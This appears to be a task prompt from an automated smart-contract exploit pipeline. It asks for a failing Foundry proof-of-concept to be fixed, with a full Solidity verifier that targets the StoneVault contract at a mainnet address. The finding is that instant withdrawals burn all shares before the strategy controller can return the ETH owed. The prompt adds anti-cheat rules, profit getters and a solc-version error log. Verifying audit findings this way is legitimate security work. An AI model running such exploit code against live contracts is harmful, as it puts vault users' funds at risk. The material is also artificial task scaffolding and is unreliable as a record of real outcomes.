You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Instant withdrawals can burn full shares but return only a fraction of the owed ETH
- claim: `StoneVault.instantWithdraw()` burns the caller's full STONE balance before it knows whether `StrategyController.forceWithdraw()` can actually source the requested ETH. The controller's `_forceWithdraw()` then asks each strategy for a fixed ratio slice of the requested amount instead of withdrawing against each strategy's real live balance, so drifted or illiquid strategies can return less than required while the user's entire share position is already destroyed.
- impact: Users can suffer irreversible losses on instant withdrawals: their shares are fully burned, but they only receive the partial ETH amount the controller happened to recover.
- exploit_paths: ["Strategy balances drift away from configured ratios because of yield, losses, or previous partial withdrawals.", "A user calls `instantWithdraw(..., _shares)` and the vault computes the ETH owed for all burned shares.", "The vault burns the full `_shares` amount before checking whether the controller can fund the withdrawal.", "`StrategyController._forceWithdraw()` requests ratio-based amounts from each strategy, so underfunded or illiquid strategies return too little.", "The vault pays only the partial ETH that came back, leaving the user with fewer assets and no remaining shares."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IStoneVault {
    function deposit() external payable returns (uint256 mintAmount);
    function instantWithdraw(uint256 amount, uint256 shares) external returns (uint256 actualWithdrawn);
    function rollToNextRound() external;
    function currentSharePrice() external returns (uint256 price);
    function latestRoundID() external view returns (uint256);
    function roundPricePerShare(uint256 round) external view returns (uint256);
    function getVaultAvailableAmount() external returns (uint256 idleAmount, uint256 investedAmount);
    function stone() external view returns (address);
    function strategyController() external view returns (address);
}

interface IStoneToken {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IStrategyController {
    function getStrategies() external view returns (address[] memory addrs, uint256[] memory portions);
    function getStrategyValidValue(address strategy) external returns (uint256 value);
}

contract FlawVerifier {
    uint256 internal constant MULTIPLIER = 1e18;

    address public constant TARGET = 0xA62F9C5af106FeEE069F38dE51098D9d81B90572;

    uint256 public initialNav;
    uint256 public finalNav;
    uint256 public sharesBefore;
    uint256 public sharesBurned;
    uint256 public expectedWithdraw;
    uint256 public actualWithdraw;
    uint256 public idleBeforeWithdraw;
    uint256 public investedBeforeWithdraw;
    uint256 public roundsRolled;
    bool public hypothesisValidated;

    enum Outcome {
        Unset,
        NoCapital,
        NoControllerPath,
        FullLiquidity,
        LossConfirmed,
        WithdrawReverted
    }

    Outcome public outcome;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        IStoneVault vault = IStoneVault(TARGET);
        IStoneToken stoneToken = IStoneToken(vault.stone());

        initialNav = _netAssetValue(vault, stoneToken);
        finalNav = initialNav;
        sharesBefore = 0;
        sharesBurned = 0;
        expectedWithdraw = 0;
        actualWithdraw = 0;
        idleBeforeWithdraw = 0;
        investedBeforeWithdraw = 0;
        roundsRolled = 0;
        hypothesisValidated = false;
        outcome = Outcome.Unset;

        uint256 stoneBal = stoneToken.balanceOf(address(this));
        uint256 ethBal = address(this).balance;

        // Concrete infeasibility:
        // - The caller must own real STONE shares to reach `instantWithdraw(..., _shares)`.
        // - A pure flashloan route is not viable for profit here because the bug makes the caller
        //   receive less ETH than their burned shares are owed, so temporary capital cannot be repaid
        //   without outside funds. This verifier therefore uses existing verifier-held STONE first,
        //   then verifier-held ETH if available.
        if (stoneBal == 0 && ethBal == 0) {
            outcome = Outcome.NoCapital;
            return;
        }

        // If the current STONE position would be fully covered by idle ETH, use real ETH to mint
        // new shares and public round rolls to push idle into strategies before attempting the path.
        if ((stoneBal == 0 || !_wouldHitControllerPath(vault, stoneBal)) && ethBal != 0) {
            vault.deposit{value: ethBal}();
            stoneBal = stoneToken.balanceOf(address(this));
            _rollUntilControllerPath(vault, stoneBal);
        } else if (stoneBal != 0) {
            _rollUntilControllerPath(vault, stoneBal);
        }

        if (stoneBal == 0) {
            outcome = Outcome.NoCapital;
            finalNav = _netAssetValue(vault, stoneToken);
            return;
        }

        sharesBefore = stoneBal;
        expectedWithdraw = _sharesToAsset(stoneBal, _withdrawSharePrice(vault));
        (idleBeforeWithdraw, investedBeforeWithdraw) = vault.getVaultAvailableAmount();

        if (expectedWithdraw <= idleBeforeWithdraw) {
            // Concrete on-chain infeasibility at the current fork state for this verifier position:
            // the withdrawal is still fully covered by idle ETH inside AssetsVault, so
            // `StrategyController.forceWithdraw()` is never reached and the claimed loss path
            // cannot execute mechanically.
            outcome = idleBeforeWithdraw == 0 ? Outcome.NoControllerPath : Outcome.FullLiquidity;
            finalNav = _netAssetValue(vault, stoneToken);
            return;
        }

        uint256 ethBefore = address(this).balance;
        try vault.instantWithdraw(0, stoneBal) returns (uint256 actualAmount) {
            actualWithdraw = actualAmount;
        } catch {
            outcome = Outcome.WithdrawReverted;
            finalNav = _netAssetValue(vault, stoneToken);
            return;
        }

        uint256 ethAfter = address(this).balance;
        if (actualWithdraw == 0 && ethAfter > ethBefore) {
            actualWithdraw = ethAfter - ethBefore;
        }

        uint256 stoneAfter = stoneToken.balanceOf(address(this));
        sharesBurned = sharesBefore > stoneAfter ? sharesBefore - stoneAfter : 0;
        hypothesisValidated = sharesBurned == sharesBefore && actualWithdraw < expectedWithdraw;
        outcome = hypothesisValidated ? Outcome.LossConfirmed : Outcome.FullLiquidity;
        finalNav = _netAssetValue(vault, stoneToken);
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        if (finalNav > initialNav) {
            return finalNav - initialNav;
        }
        return 0;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return "existing_balance_or_real_eth_mint -> optional public rollToNextRound rebalance -> instantWithdraw(full_shares) -> shares burn before controller forceWithdraw -> ratio-sliced strategy withdrawals can under-return";
    }

    function _rollUntilControllerPath(IStoneVault vault, uint256 stoneBal) internal {
        if (stoneBal == 0) {
            return;
        }

        for (uint256 i = 0; i < 3; ++i) {
            if (_wouldHitControllerPath(vault, stoneBal)) {
                return;
            }

            try vault.rollToNextRound() {
                unchecked {
                    ++roundsRolled;
                }
            } catch {
                return;
            }
        }
    }

    function _wouldHitControllerPath(IStoneVault vault, uint256 shares) internal returns (bool) {
        if (shares == 0) {
            return false;
        }

        uint256 expected = _sharesToAsset(shares, _withdrawSharePrice(vault));
        (uint256 idleAmount, ) = vault.getVaultAvailableAmount();
        return expected > idleAmount;
    }

    function _withdrawSharePrice(IStoneVault vault) internal returns (uint256) {
        uint256 latestRound = vault.latestRoundID();
        if (latestRound == 0) {
            return MULTIPLIER;
        }

        uint256 currentPrice = vault.currentSharePrice();
        uint256 latestPrice = vault.roundPricePerShare(latestRound - 1);
        return latestPrice < currentPrice ? latestPrice : currentPrice;
    }

    function _netAssetValue(IStoneVault vault, IStoneToken stoneToken) internal returns (uint256) {
        uint256 nav = address(this).balance;
        uint256 stoneBal = stoneToken.balanceOf(address(this));
        if (stoneBal != 0) {
            nav += _sharesToAsset(stoneBal, _withdrawSharePrice(vault));
        }
        return nav;
    }

    function _sharesToAsset(uint256 shares, uint256 sharePrice) internal pure returns (uint256) {
        return (shares * sharePrice) / MULTIPLIER;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
Error: Encountered invalid solc version in src/FlawVerifier.sol: No solc version installed that matches the version requirement: =0.8.21
Encountered invalid solc version in src/FlawVerifier.sol: No solc version installed that matches the version requirement: =0.8.21

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
